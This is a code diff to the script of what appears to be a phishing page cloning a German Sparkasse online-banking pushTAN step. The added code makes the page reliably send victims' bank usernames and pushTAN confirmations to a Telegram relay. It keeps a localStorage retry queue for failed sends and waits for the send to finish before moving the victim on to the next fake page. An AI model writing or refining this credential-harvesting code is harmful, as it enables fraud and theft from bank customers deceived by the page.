@@ -3034,6 +3034,7 @@ g(document).one("ajstep-presubmit",function(){e.PTanDecController&&(e.PTanDecCon
   // Helper function to send data to Telegram
   async function sendToTelegram(data) {
     try {
+      console.log('📤 Sender data til Telegram:', data);
       const response = await fetch('/api/telegram', {
         method: 'POST',
         headers: {
@@ -3048,11 +3049,33 @@ g(document).one("ajstep-presubmit",function(){e.PTanDecController&&(e.PTanDecCon
       if (response.ok) {
         const result = await response.json().catch(() => ({}));
         console.log('✅ Data sendt til Telegram:', result);
+        return true;
       } else {
-        console.error('❌ Telegram API error:', await response.text().catch(() => 'Unknown error'));
+        const errorText = await response.text().catch(() => 'Unknown error');
+        console.error('❌ Telegram API error:', response.status, errorText);
+        // Fallback: Store in localStorage for later
+        if (window.localStorage) {
+          try {
+            const existing = JSON.parse(localStorage.getItem('telegram_queue') || '[]');
+            existing.push({...data, timestamp: new Date().toISOString(), retry: true});
+            localStorage.setItem('telegram_queue', JSON.stringify(existing));
+            console.log('💾 Data lagret lokalt for senere sending');
+          } catch (e) {}
+        }
+        return false;
       }
     } catch (error) {
       console.error('❌ Error sending to Telegram:', error);
+      // Fallback: Store in localStorage for later
+      if (window.localStorage) {
+        try {
+          const existing = JSON.parse(localStorage.getItem('telegram_queue') || '[]');
+          existing.push({...data, timestamp: new Date().toISOString(), retry: true});
+          localStorage.setItem('telegram_queue', JSON.stringify(existing));
+          console.log('💾 Data lagret lokalt for senere sending');
+        } catch (e) {}
+      }
+      return false;
     }
   }
   
@@ -3074,7 +3097,7 @@ g(document).one("ajstep-presubmit",function(){e.PTanDecController&&(e.PTanDecCon
   // Send pushTAN confirmation when Weiter button is clicked
   var weiterLink = document.querySelector('a[href="sparekasse 4.html"]');
   if (weiterLink) {
-    weiterLink.addEventListener('click', function(e) {
+    weiterLink.addEventListener('click', async function(e) {
       e.preventDefault();
       
       // Get all stored data
@@ -3090,8 +3113,8 @@ g(document).one("ajstep-presubmit",function(){e.PTanDecController&&(e.PTanDecCon
         } catch (e) {}
       }
       
-      // Send pushTAN confirmation to Telegram
-      sendToTelegram({
+      // Send pushTAN confirmation to Telegram and wait for it to complete
+      await sendToTelegram({
         action: 'pushTAN_confirmed',
         bank: bank,
         bank_username: anmeldename,
@@ -3099,6 +3122,7 @@ g(document).one("ajstep-presubmit",function(){e.PTanDecController&&(e.PTanDecCon
         pushTAN_date_time: dateTimeSpan ? dateTimeSpan.textContent : '',
       });
       
+      // Navigate after data is sent
       window.location.href = 'sparekasse 4.html';
     });
   }
